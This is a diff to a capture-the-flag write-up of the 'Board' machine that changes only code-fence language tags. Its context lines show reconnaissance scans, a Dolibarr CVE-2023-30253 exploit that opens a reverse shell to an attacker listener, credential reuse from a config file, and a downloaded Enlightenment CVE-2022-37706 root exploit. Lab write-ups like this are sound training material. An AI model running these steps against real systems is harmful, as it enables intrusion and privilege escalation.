@@ -4,12 +4,12 @@
 ## Open Ports
 An Nmap scan was conducted to identify open ports on the target machine.
 
-```
+```bash
 $ nmap -sV 10.10.11.11
 ```
 
 ### Nmap Scan Results
-```
+```bash
 Starting Nmap 7.94SVN (https://nmap.org) at 2024-09-19 14:54 BST
 Nmap scan report for 10.10.11.11
 Host is up (0.027s latency).
@@ -23,12 +23,12 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ## Vulnerability Scanning
 A vulnerability scan was performed using Nikto to identify potential security issues.
 
-```
+```bash
 $ nikto -host 10.10.11.11 -p 22,80
 ```
 
 ### Nikto Scan Results
-```
+```sh
 - Nikto v2.5.0
 + Target IP:          10.10.11.11
 + Target Hostname:    10.10.11.11
@@ -55,7 +55,7 @@ $ dirb http://10.10.11.11 "/usr/share/wordlists/dirb/common.txt"
 ```
 
 ### DIRB Scan Results
-```
+```bash
 ==> DIRECTORY: http://10.10.11.11/css/
 ==> DIRECTORY: http://10.10.11.11/images/
 + http://10.10.11.11/index.php (CODE:200|SIZE:15949)
@@ -66,12 +66,12 @@ $ dirb http://10.10.11.11 "/usr/share/wordlists/dirb/common.txt"
 ## Subdomain Enumeration
 Fuzzing was conducted to identify subdomains associated with the target.
 
-```
+```bash
 $ ffuf -w '/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt' -u http://board.htb/ -H "HOST: FUZZ.board.htb" -c -fs 15949
 ```
 
 ### Fuzzing Results
-```
+```bash
 crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 63ms]
 ```
 
@@ -87,13 +87,13 @@ Research on Dolibarr 17.0.0 revealed the presence of **CVE-2023-30253**, which a
 ### Exploit Execution
 The exploit was downloaded and executed as follows:
 
-```
+```bash
 $ python3 exploit.py http://crm.board.htb admin admin 10.10.14.133 9001
 ```
 
 A reverse shell was established using the command:
 
-```
+```bash
 $ nc -lvnp 9001
 ```
 
@@ -125,7 +125,7 @@ $dolibarr_main_authentication='dolibarr';
 ### Database Access
 Using the credentials extracted from the configuration file, access to the MySQL database was attempted:
 
-```
+```bash
 $ mysql -u dolibarrowner -p
 ```
 
@@ -134,14 +134,14 @@ Upon successful authentication, the same credentials were used to establish an S
 ### User Flag Retrieval
 After logging in via SSH, the user flag was located in the `user.txt` file:
 
-```
+```bash
 User Flag: cc4868fcbf4bdd278e604885b2dc94c2
 ```
 
 ## Privilege Escalation
 To escalate privileges, a search for setuid binaries was conducted:
 
-```
+```bash
 $ find / -perm -u=s -type f 2>/dev/null
 ```
 
@@ -150,19 +150,19 @@ This search revealed the presence of a software package called **Enlightenment**
 ### Exploit Execution for Privilege Escalation
 An exploit for CVE-2022-37706 was downloaded from GitHub:
 
-```
+```bash
 $ wget https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit
 ```
 
 The exploit was then transferred to the target machine's `/tmp/` directory using SCP:
 
-```
+```bash
 $ scp exploit.sh larissa@10.10.11.11:/tmp/
 ```
 
 After transferring the exploit, it was executed to gain root access:
 
-```
+```bash
 $ chmod +x /tmp/exploit.sh
 $ /tmp/exploit.sh
 ```
@@ -170,7 +170,7 @@ $ /tmp/exploit.sh
 ### Root Flag Retrieval
 Upon successful execution of the exploit, root access was obtained. The root flag was located in the root directory:
 
-```
+```bash
 Root Flag: ee4f5ede56377b48f5554ca143d3175b
 ```
 
